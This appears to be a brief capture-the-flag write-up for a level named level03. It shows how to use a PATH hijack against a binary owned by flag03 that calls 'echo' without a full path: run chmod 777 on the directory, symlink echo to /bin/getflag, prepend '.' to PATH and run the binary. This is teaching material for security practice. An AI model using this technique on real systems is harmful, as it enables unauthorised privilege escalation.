We saw an executable named level03 with flag03 ownership. We used ltrace to view function calls
and we saw that there was a system call to echo.
So we changed the rights on the current direction to be able to create a symbolic link:

$> chmod 777 .
$> ln -s /bin/getflag echo

Then we added the current directory to the PATH and executed level03:

$> export PATH=.:$PATH
$> ./level03
